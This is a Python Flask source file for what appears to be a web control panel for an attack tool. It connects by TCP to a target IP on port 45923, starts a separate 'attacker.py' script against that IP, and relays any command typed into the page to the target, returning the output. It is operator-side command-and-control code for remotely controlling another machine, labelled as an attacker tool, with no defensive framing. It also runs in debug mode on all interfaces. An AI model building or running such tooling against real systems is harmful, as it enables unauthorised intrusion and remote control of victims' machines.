from flask import Flask, render_template, request, jsonify
import subprocess
import socket
import threading

app = Flask(__name__)

# Global variable to hold the command socket
command_socket = None

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/set_ip', methods=['POST'])
def set_ip():
    ip_address = request.json.get('ip')
    global command_socket

    try:
        # Set up the socket to connect to the target
        command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        command_socket.connect((ip_address, 45923))  # Connect to the target

        # Start the attacker script and pass the IP address
        threading.Thread(target=run_attacker, args=(ip_address,), daemon=True).start()

        return jsonify({"status": "success", "message": "Attacker started and connected."}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    global command_socket
    command = request.json.get('command')

    if command_socket:
        try:
            command_socket.sendall(command.encode('utf-8'))
            response = command_socket.recv(4096).decode('utf-8')
            return jsonify({"status": "success", "output": response}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    else:
        return jsonify({"status": "error", "message": "No active connection."}), 400

def run_attacker(ip_address):
    try:
        subprocess.run(['python', 'attacker.py', ip_address])  # Ensure this script accepts the IP
    except Exception as e:
        print(f"Error starting attacker script: {e}")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=45922, debug=True)
